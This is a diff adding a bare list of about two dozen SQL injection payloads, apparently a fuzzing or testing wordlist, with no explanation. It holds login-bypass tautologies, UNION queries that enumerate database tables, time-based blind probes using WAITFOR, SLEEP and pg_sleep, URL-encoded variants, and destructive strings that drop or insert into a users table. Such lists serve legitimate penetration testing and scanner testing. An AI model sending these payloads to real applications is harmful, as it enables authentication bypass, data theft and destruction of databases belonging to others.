@@ -1,0 +1,25 @@
+' 
+''
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+" OR "1"="1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+1' UNION SELECT table_name FROM information_schema.tables--
+1' AND '1'='1
+1' AND '1'='2
+' AND 1=1--
+' AND 1=2--
+'; WAITFOR DELAY '0:0:5'--
+' OR SLEEP(5)--
+1; SELECT pg_sleep(5)--
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('x','x')--
+'/*
+'--
+'#
+admin'--
+%27 OR %271%27=%271
+%27 OR 1=1--
